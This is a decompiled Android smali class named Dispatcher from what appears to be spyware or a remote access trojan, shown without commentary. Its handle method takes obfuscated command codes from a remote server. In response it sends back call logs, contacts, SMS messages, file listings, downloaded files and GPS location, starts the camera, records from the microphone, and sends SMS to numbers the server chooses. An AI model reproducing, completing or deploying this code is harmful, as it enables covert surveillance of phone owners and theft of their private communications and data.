.class public Lcom/piupiupiu/Dispatcher;
.super Ljava/lang/Object;
.source "Dispatcher.java"


# static fields
.field private static final MAX_RETRY:I = 0x3

.field private static final TAG:Ljava/lang/String; = "core"

.field public static context:Landroid/content/Context;

.field private static final fm:Lcom/piupiupiu/FileManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 16
    new-instance v0, Lcom/piupiupiu/FileManager;

    invoke-direct {v0}, Lcom/piupiupiu/FileManager;-><init>()V

    sput-object v0, Lcom/piupiupiu/Dispatcher;->fm:Lcom/piupiupiu/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 0
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Lorg/json/JSONObject;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 10
    invoke-static {p0, p1}, Lcom/piupiupiu/Dispatcher;->handle(Ljava/lang/String;Lorg/json/JSONObject;)V

    return-void
.end method

.method public static calls()V
    .locals 3

    .prologue
    .line 120
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v0

    const-string v1, "c2h6vn"

    invoke-static {}, Lcom/piupiupiu/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 121
    return-void
.end method

.method public static camera(I)V
    .locals 4
    .param p0, "req"    # I

    .prologue
    const/4 v3, 0x1

    .line 90
    const/4 v1, -0x1

    if-ne p0, v1, :cond_1

    .line 91
    new-instance v1, Lcom/piupiupiu/CameraManager;

    sget-object v2, Lcom/piupiupiu/Dispatcher;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/piupiupiu/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Lcom/piupiupiu/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object v0

    .line 92
    .local v0, "cameraList":Lorg/json/JSONObject;
    if-eqz v0, :cond_0

    .line 93
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v1

    const-string v2, "k7f2qa"

    invoke-virtual {v1, v2, v0}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 100
    .end local v0    # "cameraList":Lorg/json/JSONObject;
    :cond_0
    :goto_0
    return-void

    .line 95
    :cond_1
    if-ne p0, v3, :cond_2

    .line 96
    new-instance v1, Lcom/piupiupiu/CameraManager;

    sget-object v2, Lcom/piupiupiu/Dispatcher;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/piupiupiu/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v3}, Lcom/piupiupiu/CameraManager;->startUp(I)V

    goto :goto_0

    .line 97
    :cond_2
    if-nez p0, :cond_0

    .line 98
    new-instance v1, Lcom/piupiupiu/CameraManager;

    sget-object v2, Lcom/piupiupiu/Dispatcher;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/piupiupiu/CameraManager;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Lcom/piupiupiu/CameraManager;->startUp(I)V

    goto :goto_0
.end method

.method public static contacts()V
    .locals 3

    .prologue
    .line 124
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v0

    const-string v1, "n5j1pr"

    invoke-static {}, Lcom/piupiupiu/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 125
    return-void
.end method

.method public static files(ILjava/lang/String;)V
    .locals 3
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    .line 103
    if-nez p0, :cond_1

    .line 104
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v0

    const-string v1, "m3b8tz"

    sget-object v2, Lcom/piupiupiu/Dispatcher;->fm:Lcom/piupiupiu/FileManager;

    invoke-static {p1}, Lcom/piupiupiu/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 108
    :cond_0
    :goto_0
    return-void

    .line 105
    :cond_1
    const/4 v0, 0x1

    if-ne p0, v0, :cond_0

    .line 106
    sget-object v0, Lcom/piupiupiu/Dispatcher;->fm:Lcom/piupiupiu/FileManager;

    invoke-static {p1}, Lcom/piupiupiu/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static handle(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 5
    .param p0, "order"    # Ljava/lang/String;
    .param p1, "data"    # Lorg/json/JSONObject;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 53
    const-string v1, "k7f2qa"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 54
    const-string v1, "op"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 55
    .local v0, "extra":Ljava/lang/String;
    const-string v1, "cv"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 56
    const/4 v1, -0x1

    invoke-static {v1}, Lcom/piupiupiu/Dispatcher;->camera(I)V

    .line 85
    .end local v0    # "extra":Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 57
    .restart local v0    # "extra":Ljava/lang/String;
    :cond_1
    const-string v1, "1"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 58
    invoke-static {v3}, Lcom/piupiupiu/Dispatcher;->camera(I)V

    goto :goto_0

    .line 59
    :cond_2
    const-string v1, "0"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 60
    invoke-static {v2}, Lcom/piupiupiu/Dispatcher;->camera(I)V

    goto :goto_0

    .line 62
    .end local v0    # "extra":Ljava/lang/String;
    :cond_3
    const-string v1, "m3b8tz"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 63
    const-string v1, "op"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 64
    .restart local v0    # "extra":Ljava/lang/String;
    const-string v1, "ls"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 65
    const-string v1, "fp"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Lcom/piupiupiu/Dispatcher;->files(ILjava/lang/String;)V

    goto :goto_0

    .line 66
    :cond_4
    const-string v1, "dl"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 67
    const-string v1, "fp"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lcom/piupiupiu/Dispatcher;->files(ILjava/lang/String;)V

    goto :goto_0

    .line 69
    .end local v0    # "extra":Ljava/lang/String;
    :cond_5
    const-string v1, "s9d4wx"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    .line 70
    const-string v1, "op"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 71
    .restart local v0    # "extra":Ljava/lang/String;
    const-string v1, "ls"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 72
    invoke-static {v2, v4, v4}, Lcom/piupiupiu/Dispatcher;->sms(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 73
    :cond_6
    const-string v1, "tx"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 74
    const-string v1, "rc"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "bd"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v1, v2}, Lcom/piupiupiu/Dispatcher;->sms(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 76
    .end local v0    # "extra":Ljava/lang/String;
    :cond_7
    const-string v1, "c2h6vn"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 77
    invoke-static {}, Lcom/piupiupiu/Dispatcher;->calls()V

    goto/16 :goto_0

    .line 78
    :cond_8
    const-string v1, "n5j1pr"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    .line 79
    invoke-static {}, Lcom/piupiupiu/Dispatcher;->contacts()V

    goto/16 :goto_0

    .line 80
    :cond_9
    const-string v1, "w8k3qu"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_a

    .line 81
    const-string v1, "dur"

    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v1

    invoke-static {v1}, Lcom/piupiupiu/Dispatcher;->mic(I)V

    goto/16 :goto_0

    .line 82
    :cond_a
    const-string v1, "l4t7ye"

    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 83
    invoke-static {}, Lcom/piupiupiu/Dispatcher;->location()V

    goto/16 :goto_0
.end method

.method public static location()V
    .locals 8
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 132
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 133
    new-instance v0, Lcom/piupiupiu/LocManager;

    sget-object v6, Lcom/piupiupiu/Dispatcher;->context:Landroid/content/Context;

    invoke-direct {v0, v6}, Lcom/piupiupiu/LocManager;-><init>(Landroid/content/Context;)V

    .line 134
    .local v0, "gps":Lcom/piupiupiu/LocManager;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 136
    .local v1, "location":Lorg/json/JSONObject;
    invoke-virtual {v0}, Lcom/piupiupiu/LocManager;->canGetLocation()Z

    move-result v6

    if-eqz v6, :cond_0

    .line 137
    invoke-virtual {v0}, Lcom/piupiupiu/LocManager;->getLatitude()D

    move-result-wide v2

    .line 138
    .local v2, "latitude":D
    invoke-virtual {v0}, Lcom/piupiupiu/LocManager;->getLongitude()D

    move-result-wide v4

    .line 139
    .local v4, "longitude":D
    const-string v6, "enable"

    const/4 v7, 0x1

    invoke-virtual {v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 140
    const-string v6, "lat"

    invoke-virtual {v1, v6, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 141
    const-string v6, "lng"

    invoke-virtual {v1, v6, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 146
    .end local v2    # "latitude":D
    .end local v4    # "longitude":D
    :goto_0
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v6

    const-string v7, "l4t7ye"

    invoke-virtual {v6, v7, v1}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 147
    return-void

    .line 143
    :cond_0
    const-string v6, "enable"

    const/4 v7, 0x0

    invoke-virtual {v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    goto :goto_0
.end method

.method public static mic(I)V
    .locals 0
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 128
    invoke-static {p0}, Lcom/piupiupiu/MicManager;->startRecording(I)V

    .line 129
    return-void
.end method

.method public static sendReq()V
    .locals 2

    .prologue
    .line 36
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v0

    .line 38
    .local v0, "link":Lcom/piupiupiu/LinkManager;
    new-instance v1, Lcom/piupiupiu/Dispatcher$1;

    invoke-direct {v1}, Lcom/piupiupiu/Dispatcher$1;-><init>()V

    invoke-virtual {v0, v1}, Lcom/piupiupiu/LinkManager;->setHandler(Lcom/piupiupiu/LinkManager$FrameHandler;)V

    .line 49
    invoke-virtual {v0}, Lcom/piupiupiu/LinkManager;->connect()V

    .line 50
    return-void
.end method

.method public static sms(ILjava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    .line 111
    if-nez p0, :cond_1

    .line 112
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v1

    const-string v2, "s9d4wx"

    invoke-static {}, Lcom/piupiupiu/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    .line 117
    :cond_0
    :goto_0
    return-void

    .line 113
    :cond_1
    const/4 v1, 0x1

    if-ne p0, v1, :cond_0

    .line 114
    invoke-static {p1, p2}, Lcom/piupiupiu/SMSManager;->relayMessage(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    .line 115
    .local v0, "isSent":Z
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v1

    const-string v2, "s9d4wx"

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V

    goto :goto_0
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 6
    .param p0, "con"    # Landroid/content/Context;

    .prologue
    const/4 v5, 0x3

    .line 22
    sput-object p0, Lcom/piupiupiu/Dispatcher;->context:Landroid/content/Context;

    .line 23
    const/4 v1, 0x0

    .line 24
    .local v1, "retry":I
    :goto_0
    if-ge v1, v5, :cond_0

    .line 26
    :try_start_0
    invoke-static {}, Lcom/piupiupiu/Dispatcher;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    :cond_0
    return-void

    .line 28
    :catch_0
    move-exception v0

    .line 29
    .local v0, "ex":Ljava/lang/Exception;
    add-int/lit8 v1, v1, 0x1

    .line 30
    const-string v2, "core"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "start failed, retry "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
